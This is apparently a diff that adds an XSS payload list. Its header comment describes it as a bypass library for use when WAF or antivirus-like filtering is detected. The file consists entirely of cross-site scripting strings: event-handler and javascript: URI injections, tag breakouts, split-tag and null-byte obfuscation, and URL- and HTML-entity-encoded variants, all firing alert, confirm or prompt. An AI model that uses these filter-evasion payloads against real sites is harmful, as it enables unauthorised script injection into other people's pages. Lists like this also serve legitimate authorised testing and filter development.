@@ -1,0 +1,91 @@
+# Dedicated bypass payload library used when WAF/AV-like filtering is detected.
+"><svg/onload=alert(1)>
+"><svg/onload=confirm(1)>
+"><svg/onload=prompt(1)>
+<svg/onload=alert`1`>
+<svg/onload=confirm`1`>
+<svg/onload=prompt`1`>
+<img src=x onerror=alert(1)>
+<img src=x onerror=confirm(1)>
+<img src=x onerror=prompt(1)>
+<img src=1 onerror=alert(1)>
+<img/src=x onerror=alert(1)>
+<IMG SRC=x ONERROR=alert(1)>
+<iframe src=javascript:alert(1)></iframe>
+<iframe src=javascript:confirm(1)></iframe>
+<iframe src=javascript:prompt(1)></iframe>
+<iframe srcdoc="<script>alert(1)</script>"></iframe>
+<iframe srcdoc="<script>confirm(1)</script>"></iframe>
+<iframe srcdoc="<script>prompt(1)</script>"></iframe>
+<details open ontoggle=alert(1)>
+<details open ontoggle=confirm(1)>
+<details open ontoggle=prompt(1)>
+<marquee onstart=alert(1)>x</marquee>
+<marquee onstart=confirm(1)>x</marquee>
+<marquee onstart=prompt(1)>x</marquee>
+<body onload=alert(1)>
+<body onload=confirm(1)>
+<body onload=prompt(1)>
+<video><source onerror=alert(1)></video>
+<video><source onerror=confirm(1)></video>
+<video><source onerror=prompt(1)></video>
+<math><mtext><img src=x onerror=alert(1)></mtext></math>
+<math><mtext><img src=x onerror=confirm(1)></mtext></math>
+<math><mtext><img src=x onerror=prompt(1)></mtext></math>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<svg><animate onbegin=confirm(1) attributeName=x dur=1s>
+<svg><animate onbegin=prompt(1) attributeName=x dur=1s>
+<script>alert(1)</script>
+<script>confirm(1)</script>
+<script>prompt(1)</script>
+<script>setTimeout(alert,1,1)</script>
+<script>setTimeout(confirm,1,1)</script>
+<script>setTimeout(prompt,1,1)</script>
+</script><script>alert(1)</script>
+</script><script>confirm(1)</script>
+</script><script>prompt(1)</script>
+</title><script>alert(1)</script>
+</title><script>confirm(1)</script>
+</title><script>prompt(1)</script>
+</textarea><script>alert(1)</script>
+</textarea><script>confirm(1)</script>
+</textarea><script>prompt(1)</script>
+</style><script>alert(1)</script>
+</style><script>confirm(1)</script>
+</style><script>prompt(1)</script>
+<scr<script>ipt>alert(1)</scr<script>ipt>
+<scr<script>ipt>confirm(1)</scr<script>ipt>
+<scr<script>ipt>prompt(1)</scr<script>ipt>
+<scri%00pt>alert(1)</scri%00pt>
+<scri%00pt>confirm(1)</scri%00pt>
+<scri%00pt>prompt(1)</scri%00pt>
+%3Cscript%3Ealert(1)%3C%2Fscript%3E
+%3Cscript%3Econfirm(1)%3C%2Fscript%3E
+%3Cscript%3Eprompt(1)%3C%2Fscript%3E
+%253Cscript%253Ealert(1)%253C%252Fscript%253E
+%253Cscript%253Econfirm(1)%253C%252Fscript%253E
+%253Cscript%253Eprompt(1)%253C%252Fscript%253E
+&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;script&gt;confirm(1)&lt;/script&gt;
+&lt;script&gt;prompt(1)&lt;/script&gt;
+&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;
+&#x3c;script&#x3e;confirm(1)&#x3c;/script&#x3e;
+&#x3c;script&#x3e;prompt(1)&#x3c;/script&#x3e;
+';alert(1);//
+';confirm(1);//
+';prompt(1);//
+";alert(1);//
+";confirm(1);//
+";prompt(1);//
+--><script>alert(1)</script>
+--><script>confirm(1)</script>
+--><script>prompt(1)</script>
+javascript:alert(1)
+javascript:confirm(1)
+javascript:prompt(1)
+<base href="javascript:alert(1);//">
+<base href="javascript:confirm(1);//">
+<base href="javascript:prompt(1);//">
+<xml onreadystatechange=alert(1)>
+<xml onreadystatechange=confirm(1)>
+<xml onreadystatechange=prompt(1)>
